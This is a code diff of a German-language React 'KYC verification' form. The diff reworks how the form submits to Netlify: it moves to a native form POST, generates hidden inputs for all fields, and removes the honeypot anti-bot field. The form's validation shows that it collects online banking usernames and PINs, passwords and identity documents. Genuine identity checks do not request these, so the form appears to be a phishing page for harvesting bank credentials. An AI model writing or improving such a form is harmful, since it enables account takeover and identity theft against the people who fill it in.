@@ -1,10 +1,8 @@
 "use client"
 
-"use client"
-
 import type React from "react"
 
-import { useState } from "react"
+import { useState, useRef } from "react"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
 import { Alert, AlertDescription } from "@/components/ui/alert"
@@ -81,6 +79,8 @@ export default function KYCForm() {
   const [showConfirm, setShowConfirm] = useState(false)
   const [showRedirect, setShowRedirect] = useState(false)
 
+  const formRef = useRef<HTMLFormElement | null>(null)
+
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
     const { name, value, type } = e.target as HTMLInputElement
     const inputValue = type === "checkbox" ? (e.target as HTMLInputElement).checked : value
@@ -135,7 +135,6 @@ export default function KYCForm() {
         if (!formData.onlineBankingUsername.trim()) newErrors.onlineBankingUsername = "Benutzername ist erforderlich"
         if (!formData.onlineBankingPin.trim()) newErrors.onlineBankingPin = "PIN ist erforderlich"
         break
-
 
       case 4: // Security
         if (!formData.password) newErrors.password = "Password is required"
@@ -232,7 +231,6 @@ export default function KYCForm() {
     // Documents
     if (!Array.isArray(formData.documents) || formData.documents.length === 0) newErrors.documents = "At least one document is required"
 
-
     setErrors(newErrors)
 
     if (Object.keys(newErrors).length > 0) {
@@ -275,6 +273,59 @@ export default function KYCForm() {
     setCurrentStep((prev) => Math.max(prev - 1, 1))
   }
 
+  const ensureHiddenInputs = () => {
+    const form = formRef.current
+    if (!form) return
+
+    // Remove previously generated hidden inputs
+    const prevGenerated = Array.from(form.querySelectorAll('input[data-generated="true"]'))
+    prevGenerated.forEach((el) => el.remove())
+
+    // Ensure file input files are set (handles drag-and-drop flows where input.files may not be populated)
+    const fileInput = form.querySelector('input[type="file"][name="documents"]') as HTMLInputElement | null
+    if (fileInput) {
+      const docs: File[] = Array.isArray(formData.documents) ? formData.documents : []
+      if (docs.length > 0) {
+        try {
+          const dataTransfer = new DataTransfer()
+          docs.forEach((f: File) => dataTransfer.items.add(f))
+          // assign the generated FileList to the native input so multipart/form-data contains the files
+          // some environments allow setting input.files via DataTransfer
+          fileInput.files = dataTransfer.files
+        } catch (err) {
+          // Some browsers may disallow setting input.files; fall back to providing filenames as hidden inputs
+          // Netlify won't receive the binary files in this fallback, but will at least receive metadata.
+          // We still continue to add regular hidden fields below.
+          // eslint-disable-next-line no-console
+          console.warn("Could not set file input.files directly; falling back to filename-only hidden fields.", err)
+        }
+      }
+      // If fileInput.files is still empty, create filename hidden inputs as fallback
+      if (!fileInput.files || fileInput.files.length === 0) {
+        const docsFallback: File[] = Array.isArray(formData.documents) ? formData.documents : []
+        docsFallback.forEach((f: File, i: number) => {
+          const fi = document.createElement("input")
+          fi.type = "hidden"
+          fi.name = `documents_filenames[]`
+          fi.value = f.name
+          fi.setAttribute("data-generated", "true")
+          form.appendChild(fi)
+        })
+      }
+    }
+
+    Object.entries(formData).forEach(([key, value]) => {
+      if (key === "documents") return // file input exists in DOM and we handled file population above
+
+      const input = document.createElement("input")
+      input.type = "hidden"
+      input.name = key
+      input.value = typeof value === "boolean" ? (value ? "yes" : "no") : String(value ?? "")
+      input.setAttribute("data-generated", "true")
+      form.appendChild(input)
+    })
+  }
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     if (validateAllSteps()) {
@@ -283,45 +334,24 @@ export default function KYCForm() {
   }
 
   const submitToNetlify = async () => {
+    // Netlify will handle the form submission when the form is submitted as a standard multipart/form-data POST.
+    // We ensure all dynamic fields are present as hidden inputs and then submit the native form element.
     setIsSubmitting(true)
     setSubmitError(null)
     setShowConfirm(false)
-    setShowRedirect(true)
+
     try {
-      const netlifyFormData = new FormData()
-      netlifyFormData.append("form-name", "kyc-verification")
+      ensureHiddenInputs()
 
-      Object.entries(formData).forEach(([key, value]) => {
-        if (key === "documents") {
-          formData.documents.forEach((file, index) => {
-            netlifyFormData.append(`document-${index + 1}`, file)
-          })
-        } else if (typeof value === "boolean") {
-          netlifyFormData.append(key, value ? "yes" : "no")
-        } else if (value !== null && value !== undefined) {
-          netlifyFormData.append(key, String(value))
-        }
-      })
-
-      const response = await fetch("/", {
-        method: "POST",
-        body: netlifyFormData,
-      })
-
-      if (!response.ok) {
-        throw new Error("Form submission failed")
-      }
-
-      if (typeof window !== "undefined") {
-        window.location.assign("/success")
+      if (formRef.current) {
+        // Submit the native form so Netlify Forms can process it and redirect to /success
+        formRef.current.submit()
+      } else {
+        throw new Error("Form not available")
       }
     } catch (error) {
-      console.error("Submission error:", error)
+      console.error("Netlify submission error:", error)
       setSubmitError("Es ist ein Fehler aufgetreten. Bitte versuchen Sie es erneut.")
-      setShowRedirect(false)
-      if (typeof window !== "undefined") {
-        window.location.assign("/error")
-      }
     } finally {
       setIsSubmitting(false)
     }
@@ -403,23 +433,18 @@ export default function KYCForm() {
             </CardDescription>
           </CardHeader>
           <CardContent>
-            {/* Netlify Forms hidden fields and honeypot */}
             <form
+              ref={formRef}
               onSubmit={handleSubmit}
               className="space-y-6"
               name="kyc-verification"
-              data-netlify="true"
-              data-netlify-honeypot="bot-field"
               action="/success"
               method="POST"
               encType="multipart/form-data"
+              data-netlify="true"
             >
+              {/* Netlify form name (required for Netlify to detect the form) */}
               <input type="hidden" name="form-name" value="kyc-verification" />
-              <div className="hidden">
-                <label>
-                  Don't fill this out if you're human: <input name="bot-field" />
-                </label>
-              </div>
 
               {/* Step Sections */}
               {currentStep === 1 && (
